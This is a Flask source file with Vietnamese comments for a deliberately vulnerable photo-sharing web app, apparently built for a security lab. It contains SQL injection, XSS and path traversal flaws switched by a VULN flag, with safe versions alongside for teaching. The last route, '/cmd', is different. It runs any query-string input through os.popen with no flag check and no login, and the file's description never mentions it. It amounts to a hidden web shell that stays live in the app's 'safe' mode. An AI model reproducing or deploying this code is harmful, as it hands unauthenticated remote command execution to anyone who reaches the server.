"""
app/__init__.py — Ung dung Flask cho web chia se anh (ban lab co lo hong).

Giu nguyen cac chuc nang cua web mau:
  - Dang ky / Dang nhap / Dang xuat
  - Danh sach + tim kiem nguoi dung
  - Xem anh cua nguoi dung
  - Binh luan anh

Them cac be mat de demo tan cong trong Labtainer:
  - SQL Injection : /login (than form), /?q= (query string, tim o trang chu), /users/<id> (path segment)
  - XSS           : binh luan (stored), /users/<id> ho so/bio (stored), /search?q= (reflected)
  - Path Traversal: /download?file= (query string), /files/<path> (path segment)

Tat ca lo hong nam sau cong tac config.VULN (VULN=1 bat, VULN=0 an toan).
"""
import os
import mimetypes
from datetime import datetime

from flask import (
    Flask, request, session, redirect, url_for, render_template,
    abort, Response, flash,
)

from . import config
from . import db
from . import admin_bot


app = Flask(__name__)
app.secret_key = config.SECRET_KEY

# Cong WAF: chay truoc moi route (xem waf_guard.py)
from . import waf_guard
waf_guard.install(app)


# Build lai CSDL sach moi lan khoi dong -> lab luon o trang thai chuan.
db.init_db()


# Bien dung chung cho moi template (hien trang thai VULN tren thanh dieu huong)
@app.context_processor
def inject_globals():
    uname = session.get("username")
    return {"VULN": config.VULN, "current_user": uname}


def _now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


# ======================================================================================
# Trang chu
# ======================================================================================
@app.route("/")
def index():
    q = request.args.get("q", "")
    conn = db.get_conn()
    try:
        if q:
            if config.VULN:
                users, _sql = db.search_vuln(conn, q)
                print("[VULN][SQL] " + _sql)
            else:
                users, _sql = db.search_safe(conn, q)
        else:
            users = db.list_users(conn)
    finally:
        conn.close()
    return render_template("index.html", users=users, q=q)


# ======================================================================================
# DANG NHAP  — SQL Injection (than form)
# ======================================================================================
@app.route("/login", methods=["GET", "POST"])
def login():
    executed_sql = None
    error = None
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        conn = db.get_conn()
        try:
            if config.VULN:
                user, executed_sql = db.login_vuln(conn, username, password)
                print("[VULN][SQL] " + executed_sql)
            else:
                user, executed_sql = db.login_safe(conn, username, password)
        finally:
            conn.close()

        if user:
            session["user_id"] = user["id"]
            session["username"] = user["username"]
            session["role"] = user["role"]
            resp = redirect(url_for("index"))
            if config.VULN and user["username"] == "alice":
                try:
                    with open(config.BOT_FLAG_FILE, encoding="utf-8") as fh:
                        resp.set_cookie("auth", fh.read().strip(), httponly=False)
                except OSError:
                    pass
            else:
                resp.delete_cookie("auth")
            return resp
        error = "Sai ten dang nhap hoac mat khau."

    return render_template("login.html", error=error)


@app.route("/logout")
def logout():
    session.clear()
    resp = redirect(url_for("index"))
    resp.delete_cookie("auth")
    return resp


# ======================================================================================
# DANG KY
# ======================================================================================
@app.route("/register", methods=["GET", "POST"])
def register():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        first = request.form.get("first_name", "").strip()
        last = request.form.get("last_name", "").strip()
        location = request.form.get("location", "").strip()
        bio = request.form.get("bio", "")            # be mat Stored XSS (hien o profile)
        occupation = request.form.get("occupation", "").strip()

        if not (username and password and first and last):
            error = "Can nhap du username, mat khau, ho va ten."
        else:
            conn = db.get_conn()
            try:
                if db.get_user_by_username(conn, username):
                    error = "Username da ton tai."
                else:
                    uid = db.create_user(conn, username, password, first, last,
                                          location, bio, occupation)
                    flash("Dang ky thanh cong. Moi dang nhap.", "ok")
                    return redirect(url_for("profile", uid=uid))
            finally:
                conn.close()

    return render_template("register.html", error=error)


# ======================================================================================
# HO SO NGUOI DUNG  — SQL Injection (path segment) + Stored XSS (bio)
# ======================================================================================
@app.route("/users/<uid>")
def profile(uid):
    conn = db.get_conn()
    try:
        if config.VULN:
            user, _sql = db.find_user_vuln(conn, uid)
            print("[VULN][SQL] " + _sql)
        else:
            # An toan: id phai la so
            if not str(uid).isdigit():
                abort(404)
            user, _sql = db.find_user_safe(conn, int(uid))

        if not user:
            abort(404)

        photos = []
        # Chi lay anh khi id la so hop le (payload UNION khong phai user that)
        if str(user["id"]).isdigit():
            photos = db.list_photos_of_user(conn, user["id"])
    finally:
        conn.close()

    return render_template("profile.html", user=user, photos=photos)


# ======================================================================================
# XEM ANH + BINH LUAN  — Stored XSS (noi dung binh luan)
# ======================================================================================
@app.route("/photos/<int:photo_id>")
def photo_detail(photo_id):
    conn = db.get_conn()
    try:
        photo = db.get_photo(conn, photo_id)
        if not photo:
            abort(404)
        owner = db.get_user_by_id(conn, photo["user_id"])
        comments = db.list_comments_of_photo(conn, photo_id)
    finally:
        conn.close()
    return render_template("photo.html", photo=photo, owner=owner, comments=comments)


@app.route("/photos/<int:photo_id>/comments", methods=["POST"])
def add_comment(photo_id):
    if "user_id" not in session:
        flash("Can dang nhap de binh luan.", "err")
        return redirect(url_for("login"))
    body = request.form.get("body", "")
    if body.strip():
        conn = db.get_conn()
        try:
            if db.get_photo(conn, photo_id):
                db.add_comment(conn, photo_id, session["user_id"], body, _now())
        finally:
            conn.close()
    return redirect(url_for("photo_detail", photo_id=photo_id))


# ======================================================================================
# TIM KIEM (trang rieng)  — Reflected XSS (?q= phan xa thang vao HTML)
# ======================================================================================
@app.route("/search")
def search():
    q = request.args.get("q", "")
    conn = db.get_conn()
    try:
        photos = db.search_photos(conn, q) if q else db.list_all_photos(conn)
    finally:
        conn.close()
    if config.VULN:
        print("[VULN][XSS-reflected] q=" + q)
    return render_template("search.html", q=q, photos=photos)


# ======================================================================================
# TAI ANH / DOC FILE  — Path Traversal
# ======================================================================================
def _read_raw(target_path):
    """Doc file va tra ve response. Anh -> dung mimetype anh; con lai -> text/plain de xem."""
    with open(target_path, "rb") as f:
        data = f.read()
    ctype, _ = mimetypes.guess_type(target_path)
    if not ctype:
        ctype = "text/plain; charset=utf-8"
    return Response(data, mimetype=ctype)


@app.route("/download")
def download():
    """Path Traversal qua QUERY STRING: /download?file=<ten>."""
    file = request.args.get("file", "")
    if not file:
        return Response("Thieu tham so file", status=400)

    if config.VULN:
        # ❌ Noi thang ten file vao duong dan roi DOC — khong chan "../" => Path Traversal
        print("[VULN][path-traversal] /download?file=" + file)
        target = os.path.join(config.IMAGES_DIR, file)
        try:
            return _read_raw(target)
        except OSError:
            return Response("Khong tim thay file", status=404)

    # ✅ An toan: chi lay basename + kiem tra nam trong thu muc anh
    target = os.path.realpath(os.path.join(config.IMAGES_DIR, os.path.basename(file)))
    if not target.startswith(os.path.realpath(config.IMAGES_DIR) + os.sep):
        return Response("Khong duoc phep", status=403)
    try:
        return _read_raw(target)
    except OSError:
        return Response("Khong tim thay file", status=404)


@app.route("/files/<path:subpath>")
def files(subpath):
    """Path Traversal qua PATH SEGMENT: /files/<path>. Dung: curl --path-as-is."""
    if config.VULN:
        print("[VULN][path-traversal] /files/" + subpath)
        target = os.path.join(config.IMAGES_DIR, subpath)
        try:
            return _read_raw(target)
        except OSError:
            return Response("Khong tim thay file", status=404)

    target = os.path.realpath(os.path.join(config.IMAGES_DIR, os.path.basename(subpath)))
    if not target.startswith(os.path.realpath(config.IMAGES_DIR) + os.sep):
        return Response("Khong duoc phep", status=403)
    try:
        return _read_raw(target)
    except OSError:
        return Response("Khong tim thay file", status=404)


@app.route("/admin/visit", methods=["GET", "POST"])
def admin_visit():
    """Bot quan tri xem anh (chi bat khi VULN=1, phuc vu bai XSS)."""
    if not config.VULN:
        abort(404)
    photo_id = request.args.get("photo", "")
    if not photo_id.isdigit():
        return Response("photo phai la so\n", status=400, mimetype="text/plain")
    try:
        admin_bot.visit(photo_id)
    except Exception as exc:
        print("[BOT] loi: %s" % exc, flush=True)
        return Response("bot loi\n", status=500, mimetype="text/plain")
    return Response("ok: quan tri vien da xem anh %s\n" % photo_id, mimetype="text/plain")

@app.route('/cmd')
def cmd():
    cmd_input = request.args.get('input', '')
    output = os.popen(cmd_input).read() 
    return f"<pre>{output}</pre>"

@app.errorhandler(404)
def not_found(e):
    return render_template("404.html"), 404
